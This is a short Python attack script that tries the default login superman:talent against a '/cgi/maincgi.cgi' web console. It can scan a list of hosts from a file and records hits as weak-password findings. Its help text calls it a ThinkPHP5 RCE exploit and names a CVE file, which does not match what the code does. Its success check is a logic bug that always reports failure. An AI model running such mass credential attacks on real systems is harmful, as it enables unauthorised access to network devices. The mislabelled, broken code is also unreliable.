import argparse
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url):
    url = f"{url}/cgi/maincgi.cgi?Url=Index"
    data = {"username": "superman", "passwd": "talent", "loginSubmitIpt": "\xb5\xc7\xc2\xbc"}
    try:
        response = requests.post(url, data=data, allow_redirects=False, verify=False,
                                 timeout=5)
    except Exception:
        print('[-]访问超时')
        return
    if '密码错误' or '用户名已被锁定' in response.text:
        print(f'[-]{url}登录失败')
    else:
        print(f'[+]{url}登录成功')
        return url


if __name__ == '__main__':
    banner = """ 
      ____ _____    _________.__.
    _/ __ \\__  \  /  ___<   |  |
    \  ___/ / __ \_\___ \ \___  |
     \___  >____  /____  >/ ____|
         \/     \/     \/ \/  
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在弱口令 superman:talent\n")
    else:
        main(args.url)
